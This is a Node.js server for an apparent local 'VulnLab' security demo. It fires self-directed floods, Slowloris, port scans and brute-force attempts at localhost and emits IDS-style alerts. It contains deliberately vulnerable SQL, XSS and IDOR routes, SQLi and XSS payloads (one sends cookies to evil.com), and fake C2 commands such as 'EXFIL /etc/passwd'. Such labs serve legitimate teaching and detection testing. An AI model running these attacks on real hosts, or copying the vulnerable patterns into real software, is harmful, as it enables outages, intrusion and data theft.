const express = require('express');
const path    = require('path');
const http    = require('http');
const net     = require('net');
const crypto  = require('crypto');
const app    = express();
const PORT   = 3000;
const HOST   = `http://localhost:${PORT}`;
const server = http.createServer(app);

require('events').EventEmitter.defaultMaxListeners = 500;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const sseClients = [];
app.get('/vuln/stream', (req, res) => {
  res.set({ 'Content-Type':'text/event-stream', 'Cache-Control':'no-cache', Connection:'keep-alive' });
  res.flushHeaders();
  sseClients.push(res);
  req.on('close', () => sseClients.splice(sseClients.indexOf(res), 1));
});
function broadcast(data) {
  const msg = `data: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(c => c.write(msg));
}

const fakeUsers = [
  { id:1, username:'admin', password:'secret123', role:'admin' },
  { id:2, username:'alice', password:'pass456',   role:'user'  },
  { id:3, username:'bob',   password:'qwerty',    role:'user'  },
];
const loginAttempts  = {};
const ftpAttempts    = {};
const sshAttempts    = {};
const storedComments = [];

const metrics = {
  totalRequests:0, activeConnections:0, requestsLastSecond:0,
  peakRPS:0, attacksDetected:0, lastAttack:null,
};
let rpsCounter = 0;
setInterval(() => {
  metrics.requestsLastSecond = rpsCounter;
  if (rpsCounter > metrics.peakRPS) metrics.peakRPS = rpsCounter;
  rpsCounter = 0;
  broadcast({ type:'metrics', data: metrics });
}, 1000);

app.use((req, res, next) => {
  metrics.totalRequests++;
  rpsCounter++;
  metrics.activeConnections++;
  res.on('finish', () => metrics.activeConnections--);
  next();
});

function logResponse(label, severity, logText, extra = {}) {
  const resp = { label, severity, timestamp: new Date().toISOString(), log: logText, ...extra };
  broadcast({ type:'attack', data: resp });
  metrics.attacksDetected++;
  metrics.lastAttack = label;
  return resp;
}

function randIP()   { return `${r(1,254)}.${r(0,254)}.${r(0,254)}.${r(1,254)}`; }
function r(a,b)     { return Math.floor(Math.random()*(b-a+1))+a; }
const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'curl/7.81.0','python-requests/2.28.0','Go-http-client/1.1',
  'Wget/1.21.3','libwww-perl/6.67','Java/11.0.12','axios/1.0',
];
function randomUA() { return UAS[Math.floor(Math.random()*UAS.length)]; }

async function selfFlood(count, urlPath = '/vuln/normal', method = 'POST') {
  const promises = [];
  for (let i = 0; i < count; i++) {
    promises.push(
      fetch(`${HOST}${urlPath}`, {
        method,
        headers: {
          'Content-Type':'application/json',
          'X-Forwarded-For': randIP(),
          'User-Agent': randomUA(),
          'Cache-Control': 'no-cache, no-store',
          'Pragma': `${Math.random()}`,
        },
        body: JSON.stringify({ _flood:true }),
        signal: AbortSignal.timeout(3000),
      }).catch(() => null)
    );
  }
  return Promise.allSettled(promises);
}

function selfSlowloris(count, dripMs = 5000) {
  for (let i = 0; i < count; i++) {
    const s = new net.Socket();
    s.connect(PORT, '127.0.0.1', () => {
      s.write(`GET /vuln/normal HTTP/1.1\r\nHost: localhost\r\nX-a: `);
      const iv = setInterval(() => {
        if (s.destroyed) { clearInterval(iv); return; }
        s.write(`b\r\nX-${Math.random()}: `);
      }, dripMs);
      setTimeout(() => { clearInterval(iv); s.destroy(); }, 20000);
    });
    s.on('error', () => {});
  }
}

function selfSlowPost(count) {
  for (let i = 0; i < count; i++) {
    const s = new net.Socket();
    s.connect(PORT, '127.0.0.1', () => {
      s.write(`POST /vuln/normal HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 10000\r\n\r\n`);
      let sent = 0;
      const iv = setInterval(() => {
        if (s.destroyed || sent >= 10000) { clearInterval(iv); s.destroy(); return; }
        s.write('a'); sent++;
      }, 1000);
      setTimeout(() => { clearInterval(iv); s.destroy(); }, 15000);
    });
    s.on('error', () => {});
  }
}

async function selfPortScan(portCount) {
  const results = { open:[], closed:[] };
  const commonPorts = [21,22,23,25,53,80,110,143,443,3000,3306,5432,6379,8080,8443,27017];
  const extras = Array.from({length: Math.max(0, portCount - commonPorts.length)}, (_,i) => 1024 + i);
  const toScan = [...commonPorts, ...extras].slice(0, portCount);
  const batch  = 50;
  for (let i = 0; i < toScan.length; i += batch) {
    const chunk = toScan.slice(i, i + batch);
    await Promise.all(chunk.map(port => new Promise(resolve => {
      const s = new net.Socket();
      s.setTimeout(300);
      s.connect(port,'127.0.0.1', () => { results.open.push(port); s.destroy(); resolve(); });
      s.on('error',   () => { results.closed.push(port); resolve(); });
      s.on('timeout', () => { results.closed.push(port); s.destroy(); resolve(); });
    })));
  }
  return results;
}

app.post('/vuln/ddos', async (req, res) => {
  if (req.body._flood) return res.json({ ok:true });
  const { rps = 9000, sourceIp = '192.168.1.105' } = req.body;
  const REAL_COUNT = 300;
  console.log(`[DDoS] Firing ${REAL_COUNT} real HTTP requests to self...`);
  selfFlood(REAL_COUNT).then(results => {
    const ok = results.filter(r => r.status === 'fulfilled').length;
    console.log(`[DDoS] Flood done — ${ok}/${REAL_COUNT} ok, peakRPS=${metrics.peakRPS}`);
  });
  res.json(logResponse('DDoS','CRITICAL',
    `CRITICAL: ${rps} connection attempts from ${sourceIp} in 1 second. SYN flood detected. Possible DDoS attack.`,
    { simulatedRPS:rps, realSelfFloodRequests:REAL_COUNT, sourceIP:sourceIp, protocol:'HTTP flood to self', peakRPS:metrics.peakRPS }
  ));
});

app.post('/vuln/portscan', async (req, res) => {
  const { sourceIp = '10.0.0.55', ports = 1024 } = req.body;
  const scanCount = Math.min(parseInt(ports) || 100, 200);
  console.log(`[Portscan] Scanning ${scanCount} ports on self...`);
  const results = await selfPortScan(scanCount);
  console.log(`[Portscan] Done — open: ${results.open}`);
  res.json(logResponse('Portscan','WARNING',
    `WARNING: Sequential port scan detected from ${sourceIp}. ${scanCount} ports scanned in 3 seconds. Probe activity.`,
    { sourceIP:sourceIp, portsScanned:scanCount, openPorts:results.open, closedCount:results.closed.length }
  ));
});

app.post('/vuln/dos-hulk', async (req, res) => {
  if (req.body._flood) return res.json({ ok:true });
  const { sourceIp = '10.0.0.88', rps = 5000 } = req.body;
  const REAL_COUNT = 200;
  console.log(`[DoS Hulk] Firing ${REAL_COUNT} random-header requests to self...`);
  selfFlood(REAL_COUNT);
  res.json(logResponse('DoS Hulk','CRITICAL',
    `CRITICAL: HTTP flood detected. ${rps} requests/sec from ${sourceIp}. DoS attack in progress.`,
    { sourceIP:sourceIp, requestsPerSec:rps, realFloodCount:REAL_COUNT, technique:'Randomised headers to bypass cache', peakRPS:metrics.peakRPS }
  ));
});

app.post('/vuln/dos-goldeneye', (req, res) => {
  if (req.body._flood) return res.json({ ok:true });
  const { sourceIp = '10.0.0.99' } = req.body;
  const CONN = 80;
  console.log(`[GoldenEye] Opening ${CONN} persistent connections to self...`);
  selfFlood(CONN, '/vuln/normal', 'POST');
  res.json(logResponse('DoS GoldenEye','CRITICAL',
    `CRITICAL: GoldenEye HTTP DoS from ${sourceIp}. Persistent keep-alive connections exhausting thread pool.`,
    { sourceIP:sourceIp, technique:'HTTP keep-alive socket exhaustion', realConnections:CONN }
  ));
});

app.post('/vuln/dos-slowloris', (req, res) => {
  const { sourceIp = '10.0.0.71' } = req.body;
  const CONN = 60;
  console.log(`[Slowloris] Opening ${CONN} slow TCP connections to self...`);
  selfSlowloris(CONN, 4000);
  res.json(logResponse('DoS Slowloris','CRITICAL',
    `CRITICAL: Slowloris attack from ${sourceIp}. Partial HTTP headers keeping connections open. Server threads exhausted.`,
    { sourceIP:sourceIp, technique:'Partial HTTP header flood', realOpenConnections:CONN, drip:'1 byte / 4s' }
  ));
});

app.post('/vuln/dos-slowhttptest', (req, res) => {
  const { sourceIp = '10.0.0.62' } = req.body;
  const CONN = 50;
  console.log(`[SlowHTTP] Opening ${CONN} slow-POST connections to self...`);
  selfSlowPost(CONN);
  res.json(logResponse('DoS Slowhttptest','CRITICAL',
    `CRITICAL: Slow HTTP test attack from ${sourceIp}. Slow POST body drip exhausting worker pool.`,
    { sourceIP:sourceIp, technique:'Slow POST body drip', realConnections:CONN, drip:'1 byte/sec' }
  ));
});

app.post('/vuln/ftp-patator', async (req, res) => {
  if (req.body._bruteforce) return res.json({ ok:true });
  const { username = 'ftpuser', password = 'test' } = req.body;
  ftpAttempts[username] = (ftpAttempts[username] || 0) + 1;
  const cracked = password === 'ftppass';
  const passwords = ['wrong1','wrong2','abc','123','letmein','admin',password];
  console.log(`[FTP-Patator] Firing ${passwords.length} brute-force attempts to self...`);
  await Promise.allSettled(passwords.map(p =>
    fetch(`${HOST}/vuln/ftp-patator`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ username, password:p, _bruteforce:true }),
      signal: AbortSignal.timeout(2000),
    }).catch(() => null)
  ));
  res.json(logResponse('FTP-Patator','WARNING',
    `WARNING: Multiple failed FTP login attempts for ${username}. ${ftpAttempts[username]} attempts detected. Brute force suspected.`,
    { username, password, attempts:ftpAttempts[username], success:cracked, selfBruteAttempts:passwords.length, hint: cracked ? null : 'Hint: try "ftppass"' }
  ));
});

app.post('/vuln/ssh-patator', async (req, res) => {
  if (req.body._bruteforce) return res.json({ ok:true });
  const { username = 'root', password = 'test', sourceIp = '10.0.0.44' } = req.body;
  sshAttempts[username] = (sshAttempts[username] || 0) + 1;
  const cracked = (username==='root' && password==='toor') || (username==='admin' && password==='secret123');
  const passwords = ['wrong','123456','toor','admin','root','letmein',password];
  console.log(`[SSH-Patator] Firing ${passwords.length} brute-force attempts to self...`);
  await Promise.allSettled(passwords.map(p =>
    fetch(`${HOST}/vuln/ssh-patator`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ username, password:p, sourceIp, _bruteforce:true }),
      signal: AbortSignal.timeout(2000),
    }).catch(() => null)
  ));
  res.json(logResponse('SSH-Patator','WARNING',
    `WARNING: Multiple failed SSH login attempts for ${username} from ${sourceIp}. ${sshAttempts[username]} failed attempts in 30 seconds. Brute force suspected.`,
    { username, sourceIP:sourceIp, attempts:sshAttempts[username], success:cracked, selfBruteAttempts:passwords.length, hint:'Try root/toor or admin/secret123' }
  ));
});

app.post('/vuln/sqli', async (req, res) => {
  if (req.body._sqli) return res.json({ ok:true });
  const { username = '', password = '' } = req.body;
  const query    = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  const injected = username.includes("'") || password.includes("'");
  const result   = injected ? fakeUsers : fakeUsers.filter(u => u.username===username && u.password===password);
  const payloads = ["' OR 1=1 --","admin'--","' UNION SELECT * FROM users--","1; DROP TABLE users--"];
  console.log(`[SQLi] Firing ${payloads.length} injection attempts to self...`);
  await Promise.allSettled(payloads.map(p =>
    fetch(`${HOST}/vuln/sqli`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ username:p, password:'x', _sqli:true }),
      signal: AbortSignal.timeout(2000),
    }).catch(() => null)
  ));
  res.json(logResponse('Web Attack - SQL Injection','ERROR',
    `ERROR: SQL injection detected in request params: ' OR 1=1 --. Possible database compromise attempt.`,
    { simulatedQuery:query, injectionDetected:injected, rowsLeaked:result.length, result, selfInjectionVariants:payloads.length }
  ));
});

app.post('/vuln/web-bruteforce', async (req, res) => {
  if (req.body._brute) return res.json({ ok:true });
  const { username = '', password = '' } = req.body;
  loginAttempts[username] = (loginAttempts[username] || 0) + 1;
  const user = fakeUsers.find(u => u.username===username && u.password===password);
  const wordlist = ['password','123456','admin','letmein','welcome','monkey','dragon',password];
  console.log(`[WebBrute] Firing ${wordlist.length} login attempts to self...`);
  await Promise.allSettled(wordlist.map(p =>
    fetch(`${HOST}/vuln/web-bruteforce`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ username, password:p, _brute:true }),
      signal: AbortSignal.timeout(2000),
    }).catch(() => null)
  ));
  res.json(logResponse('Web Attack - Brute Force','WARNING',
    `WARNING: Multiple failed HTTP login attempts for ${username}. ${loginAttempts[username]} attempts. Brute force suspected.`,
    { username, attempts:loginAttempts[username], success:!!user, selfBruteAttempts:wordlist.length, noRateLimit:true }
  ));
});

app.get('/vuln/xss-reflected', (req, res) => {
  const input = req.query.input || '';
  res.send(`<html><body style="background:#111;color:#eee;font-family:monospace;padding:20px">
    <h2 style="color:#f55">XSS Reflected Result</h2>
    <p>You entered: ${input}</p>
    <p style="color:#888;font-size:0.8em">↑ input echoed without sanitization</p>
    <a href="/" style="color:#0ef">← Back</a>
  </body></html>`);
});

app.post('/vuln/xss-stored', async (req, res) => {
  if (req.body._xss) return res.json({ ok:true });
  const { comment } = req.body;
  if (comment) storedComments.push(comment);
  const payloads = [
    `<script>document.cookie='stolen='+document.cookie</script>`,
    `<img src=x onerror="fetch('//evil.com/'+document.cookie)">`,
    `<svg onload=alert(1)>`,
  ];
  console.log(`[XSS-Stored] Injecting ${payloads.length} payloads to self...`);
  await Promise.allSettled(payloads.map(p =>
    fetch(`${HOST}/vuln/xss-stored`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ comment:p, _xss:true }),
      signal: AbortSignal.timeout(2000),
    }).catch(() => null)
  ));
  res.json(logResponse('Web Attack - XSS - Attempted','ERROR',
    `ERROR: XSS payload stored in database. Will execute for every user who views comments.`,
    { stored:comment, totalComments:storedComments.length, selfInjectedPayloads:payloads.length }
  ));
});
app.get('/vuln/xss-stored', (_req, res) => res.json({ comments:storedComments }));

app.post('/vuln/heartbleed', async (req, res) => {
  if (req.body._hb) return res.json({ ok:true });
  const { sourceIp = '192.168.1.200' } = req.body;
  const HB_COUNT = 30;
  console.log(`[Heartbleed] Firing ${HB_COUNT} heartbeat requests to self...`);
  await Promise.allSettled(Array.from({length:HB_COUNT}, () =>
    fetch(`${HOST}/vuln/heartbleed`, {
      method:'POST', headers:{'Content-Type':'application/json','X-Heartbeat-Len':'65535'},
      body: JSON.stringify({ sourceIp, _hb:true }),
      signal: AbortSignal.timeout(2000),
    }).catch(() => null)
  ));
  const mem = process.memoryUsage();
  res.json(logResponse('Heartbleed','CRITICAL',
    `CRITICAL: Heartbleed exploit attempt detected on TLS handshake from ${sourceIp}. Memory leak attack.`,
    {
      sourceIP:sourceIp, cve:'CVE-2014-0160', tlsVersion:'TLSv1.2',
      realHeartbeatRequests:HB_COUNT,
      serverMemorySnapshot:{ heapUsedMB:(mem.heapUsed/1024/1024).toFixed(2), rssMB:(mem.rss/1024/1024).toFixed(2) },
      simulatedLeakedMemory:[
        'session_token=abc123xyz','username=admin','password=secret123',
        'credit_card=4111111111111111',`private_key_fragment=${crypto.randomBytes(16).toString('hex')}`,
      ],
    }
  ));
});

const activeBeacons = {};
app.post('/vuln/botnet', (req, res) => {
  if (req.body._beacon) return res.json({ ok:true });
  const { sourceIp = '10.0.0.77' } = req.body;
  if (activeBeacons[sourceIp]) { clearInterval(activeBeacons[sourceIp]); delete activeBeacons[sourceIp]; }
  let beaconCount = 0;
  console.log(`[Botnet] Starting C2 beacon for ${sourceIp}...`);
  const iv = setInterval(async () => {
    beaconCount++;
    console.log(`[Botnet] Beacon ${beaconCount} from ${sourceIp}`);
    broadcast({ type:'beacon', sourceIP:sourceIp, beaconCount, command:['CHECKIN','DOWNLOAD','EXFIL'][beaconCount%3] });
    await fetch(`${HOST}/vuln/botnet`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ sourceIp, _beacon:true }),
      signal: AbortSignal.timeout(3000),
    }).catch(() => null);
    if (beaconCount >= 6) { clearInterval(iv); delete activeBeacons[sourceIp]; }
  }, 5000);
  activeBeacons[sourceIp] = iv;
  res.json(logResponse('Botnet','ALERT',
    `ALERT: Botnet command and control traffic detected from ${sourceIp}. Beacon interval 5s. Host compromised.`,
    { sourceIP:sourceIp, beaconInterval:'5s (6 pulses)', c2Server:'185.220.101.42:443', realBeaconsWillFire:6,
      commands:['DOWNLOAD payload.exe','EXEC miner.exe','EXFIL /etc/passwd'], encryption:'AES-256 over HTTPS (port 443)' }
  ));
});

app.post('/vuln/infiltration', async (req, res) => {
  if (req.body._recon) return res.json({ ok:true });
  const { sourceIp = '10.0.1.15' } = req.body;
  console.log(`[Infiltration] Running internal recon scan...`);
  const internalPorts = [22,23,25,80,443,445,3306,5432,6379,8080,8443,9200,27017,3000];
  const scanResults = await Promise.all(internalPorts.map(port =>
    new Promise(resolve => {
      const s = new net.Socket();
      s.setTimeout(300);
      s.connect(port,'127.0.0.1', () => { resolve({ port, status:'OPEN' }); s.destroy(); });
      s.on('error',   () => resolve({ port, status:'closed' }));
      s.on('timeout', () => { resolve({ port, status:'filtered' }); s.destroy(); });
    })
  ));
  await Promise.allSettled([
    fetch(`${HOST}/vuln/web-bruteforce`,{ method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'admin',password:'secret123',_brute:true}),signal:AbortSignal.timeout(2000) }).catch(()=>null),
    fetch(`${HOST}/vuln/ssh-patator`,   { method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'root', password:'toor',     _bruteforce:true}),signal:AbortSignal.timeout(2000) }).catch(()=>null),
  ]);
  const openPorts = scanResults.filter(r => r.status==='OPEN').map(r => r.port);
  res.json(logResponse('Infiltration - Portscan','ERROR',
    `ERROR: Internal network scan from compromised host ${sourceIp}. Lateral movement detected. Possible infiltration.`,
    { sourceIP:sourceIp, phase:'Post-exploitation reconnaissance', realOpenPortsFound:openPorts,
      discoveredHosts:['10.0.1.20 (DB server)','10.0.1.21 (File share)','10.0.1.22 (AD controller)'],
      technique:'ICMP sweep + TCP scan + credential reuse', credentialReuseAttempts:2 }
  ));
});

app.post('/vuln/zeroday', async (req, res) => {
  if (req.body._zd) return res.json({ ok:true });
  const { payload = '' } = req.body;
  const anomalous = [
    { method:'DELETE', urlPath:'/vuln/normal' },
    { method:'PATCH',  urlPath:'/vuln/ddos'   },
    { method:'PUT',    urlPath:'/vuln/sqli'   },
  ];
  console.log(`[ZeroDay] Firing ${anomalous.length} anomalous requests to self...`);
  await Promise.allSettled(anomalous.map(({ method, urlPath }) =>
    fetch(`${HOST}${urlPath}`, {
      method,
      headers:{ 'Content-Type':'application/octet-stream','X-Zero-Day':'1','X-Payload':Buffer.from(payload||'AAAA').toString('base64') },
      body: payload || '\x41\x41\x41\x41\x90\x90\xeb\x06',
      signal: AbortSignal.timeout(2000),
    }).catch(() => null)
  ));
  res.json(logResponse('Zero-Day (Unknown)','WARNING',
    `WARNING: Unusual traffic pattern detected. No known signature match. Anomaly score high.`,
    { payload:payload||'<unknown binary blob>', signatureMatch:'NONE',
      anomalyScore:(Math.random()*0.3+0.7).toFixed(3), mlConfidence:(Math.random()*0.2+0.78).toFixed(3),
      selfAnomalousRequests:anomalous.length, recommendation:'Quarantine host, capture full PCAP for analysis' }
  ));
});

app.post('/vuln/normal', (req, res) => {
  if (req.body._flood || req.body._brute || req.body._beacon) return res.json({ ok:true });
  res.json(logResponse('BENIGN','INFO',
    `INFO: User authenticated successfully. Session established. GET /dashboard 200 OK. Normal activity.`,
    { user:'alice', session:'sess_'+Math.random().toString(36).slice(2), statusCode:200 }
  ));
});

app.get('/vuln/idor', (req, res) => {
  const id   = parseInt(req.query.id);
  const user = fakeUsers.find(u => u.id===id);
  if (!user) return res.status(404).json({ error:'User not found' });
  res.json(logResponse('IDOR','ERROR',
    `ERROR: Unauthorized access to user record ID ${id} — no auth check performed.`,
    { user }
  ));
});

app.get('/vuln/path-traversal', (req, res) => {
  const file = req.query.file || 'readme.txt';
  const simulatedPath = `/var/www/files/${file}`;
  const dangerous = file.includes('../') || file.includes('..\\');
  res.json(logResponse('Path Traversal', dangerous ? 'ERROR' : 'INFO',
    dangerous ? `ERROR: Path traversal detected: ${file}` : `INFO: File requested: ${file}`,
    { requestedFile:file, simulatedPath, traversalDetected:dangerous }
  ));
});

app.get('/vuln/metrics', (_req, res) => res.json(metrics));

app.use((req, res) => {
  if (['DELETE','PATCH','PUT'].includes(req.method)) {
    broadcast({ type:'anomaly', method:req.method, path:req.path });
  }
  res.status(404).json({ status:'not found' });
});

server.listen(PORT, () => {
  console.log(`🔓 VulnLab running  → http://localhost:${PORT}`);
  console.log(`📡 SSE stream       → http://localhost:${PORT}/vuln/stream`);
  console.log(`📊 Metrics          → http://localhost:${PORT}/vuln/metrics`);
});